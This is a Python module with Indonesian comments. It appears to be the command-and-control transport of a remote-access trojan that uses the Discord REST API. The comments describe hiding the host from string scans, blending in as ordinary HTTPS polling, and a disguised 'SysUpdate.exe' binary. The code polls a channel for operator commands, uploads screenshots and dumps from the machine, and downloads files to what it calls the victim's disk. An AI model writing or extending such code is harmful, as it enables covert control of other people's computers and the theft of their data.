"""core/net.py â€” transport Discord lewat REST murni. Tanpa discord.py, tanpa gateway.

Kenapa REST: gateway butuh websocket + aiohttp + intents, bobot 30MB, dan pola
koneksinya jadi signature sendiri. Polling REST cukup requests, 3 detik interval,
kelihatan seperti request HTTPS biasa.
"""

import time

import requests

from . import config

# Base URL datang dari config terenkripsi. Nggak ada literal host di sini,
# jadi `strings SysUpdate.exe | findstr discord` balik kosong.
API = config.API


class Discord:
    def __init__(self, token, channel, uuid, alias=None):
        self.token = token
        self.channel = str(channel)
        self.uuid = uuid
        # Alias dipakai buat prefix balasan di channel, bukan buat routing.
        # Mesin banyak = uuid8 nggak kebaca, [a] jauh lebih cepat dipindai.
        self.alias = alias or uuid[:1]
        self.session = requests.Session()
        # Content-Type sengaja TIDAK di-set di sini: multipart butuh boundary sendiri.
        host = API.split("/")[2]
        self.session.headers.update({
            "Authorization": "Bot " + token,
            "User-Agent": "DiscordBot (https://%s/api, 10)" % host,
        })
        self.me = None
        self.last_id = "0"
        self.backoff = 2

    def call(self, method, path, **kwargs):
        """Retry-on-429 dan retry-on-network. Return Response atau None."""
        url = API + path
        for _ in range(4):
            try:
                r = self.session.request(method, url, timeout=45, **kwargs)
                if r.status_code == 429:
                    wait = 2.0
                    try:
                        wait = float(r.json().get("retry_after", 2.0))
                    except ValueError:
                        pass
                    time.sleep(wait + 0.5)
                    continue
                self.backoff = 2
                return r
            except requests.RequestException:
                time.sleep(self.backoff)
                self.backoff = min(self.backoff * 2, 60)
        return None

    def prime(self):
        """Ambil identitas bot + posisi pesan terakhir. False = token/channel salah."""
        r = self.call("GET", "/users/@me")
        if r is None or not r.ok:
            return False
        self.me = r.json().get("id")
        r = self.call("GET", "/channels/%s/messages?limit=1" % self.channel)
        if r is None or not r.ok:
            return False
        data = r.json()
        # Pesan terakhir jadi titik mulai: jangan eksekusi backlog lama.
        self.last_id = data[0]["id"] if data else "0"
        return True

    def poll(self):
        """Ambil pesan baru sejak last_id. Pesan bot sendiri dibuang."""
        r = self.call("GET", "/channels/%s/messages?limit=20&after=%s" % (
            self.channel, self.last_id))
        if r is None or not r.ok:
            return []
        out = []
        for msg in r.json():
            self.last_id = msg["id"]
            if msg.get("author", {}).get("id") == self.me:
                continue
            out.append(msg)
        return out

    def send(self, text):
        """Kirim teks, dipotong per 1900 char supaya nggak kena limit 2000."""
        text = str(text) if text else "(kosong)"
        for i in range(0, len(text), 1900):
            self.call("POST", "/channels/%s/messages" % self.channel,
                      json={"content": "[%s] %s" % (self.alias, text[i:i + 1900])})
            time.sleep(0.4)

    def send_file(self, path, caption=""):
        """Upload file (screenshot, dump). Multipart, boundary otomatis dari requests."""
        import os
        name = os.path.basename(path)
        with open(path, "rb") as fh:
            self.call("POST", "/channels/%s/messages" % self.channel,
                      files={"file": (name, fh, "application/octet-stream")},
                      data={"content": "[%s] %s" % (self.alias, caption)})

    def fetch(self, url, dest):
        """Tarik file dari attachment URL ke disk korban."""
        r = self.session.get(url, timeout=120, stream=True)
        r.raise_for_status()
        with open(dest, "wb") as fh:
            for chunk in r.iter_content(65536):
                fh.write(chunk)
        return dest
